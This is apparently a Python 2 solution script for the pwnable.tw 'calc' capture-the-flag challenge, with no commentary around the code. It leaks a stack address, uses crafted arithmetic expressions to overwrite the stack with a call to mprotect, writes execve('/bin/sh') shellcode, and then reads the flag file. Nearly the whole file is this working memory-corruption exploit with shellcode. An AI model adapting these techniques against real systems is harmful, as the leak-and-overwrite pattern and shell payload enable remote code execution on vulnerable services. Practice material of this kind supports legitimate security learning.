# coding: utf-8

import socket
import struct
import time
import binascii

host = 'chall.pwnable.tw'
port = 10100
command1 = '00-6\n'  # get address of numbers-struct (after parse_expr)


def get_instr(string):
    string += '\0' * ((4 - len(string) % 4) % 4)
    l = list(struct.unpack('<' + (len(string) / 4) * 'I', string))
    l.reverse()
    print '\n'.join(['push %s' % hex(x) for x in l])


def int_to_uint(val):
    return struct.unpack('<I', struct.pack('<i', val))[0]


def uint_to_int(val):
    return struct.unpack('<i', struct.pack('<I', val))[0]


def send_command_and_print(s, cmd):
    s.send(cmd)
    time.sleep(0.2)
    try:
        r = s.recv(1000)
        print r
        return r
    except:
        pass

def send_command(s, cmd):
    s.send(cmd)
    time.sleep(0.2)

def put_value(offset, prev, target):
    #    if prev > 0:
    if target < prev:
        next_val = prev - target
        if next_val > 2 ** 31 - 1:
            c, p = put_value(offset, prev, int_to_uint(target))
            return c, p
        return '00+{}-{}'.format(offset, prev - target), next_val
    elif target > prev:
        next_val = target - prev
        if next_val > 2 ** 31 - 1:
            return put_value(offset, int_to_uint(prev), target)
        return '00+{}+{}'.format(offset, target - prev), next_val
    else:
        assert True, 'Target == Prev'


def dummy():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    time.sleep(0.5)
    r = s.recv(1000)
    print r
    stackaddr = send_command_and_print(s, command1)


return_from_calc = 0x8049499
mprotect = 0x806F1F0
offset = 361
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(0.5)
s.connect((host, port))
time.sleep(0.5)
r = s.recv(1000)
print r
stack_addr = int(send_command_and_print(s, command1))
print 'Stack address, ', hex(int_to_uint(stack_addr))
shell_addr = int_to_uint(stack_addr) + 1060

MEM_ATTR = 7
commands = []
command, prev = put_value(offset=offset, prev=return_from_calc, target=mprotect)
commands.append(command)
offset += 1
command, prev = put_value(offset=offset, prev=prev, target=uint_to_int(shell_addr))
commands.append(command)
offset += 1
command, prev = put_value(offset=offset, prev=prev, target=uint_to_int(int_to_uint(stack_addr) & 0xfffff000))
commands.append(command)
offset += 1
command, prev = put_value(offset=offset, prev=prev, target=0x2000)
commands.append(command)
offset += 1
command, prev = put_value(offset=offset, prev=prev, target=MEM_ATTR)
commands.append(command)
offset += 1
print commands

shellcode = '\x31\xc0\x31\xd2\x50\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' #/bin/sh
while len(shellcode) % 4 != 0:
    shellcode += '\x00'
shellcode = struct.unpack('<' + 'i' * (len(shellcode) / 4), shellcode)
shell = []
for i, code in enumerate(shellcode):
    command, prev = put_value(offset=offset + i, prev=prev, target=code)
    shell.append(command)

all_commands = commands + shell
for command in all_commands:
    send_command_and_print(s,command+'\n')

send_command_and_print(s,'\n\n')
time.sleep(1.0)
send_command_and_print(s,'/bin/cat /home/calc/flag\n')
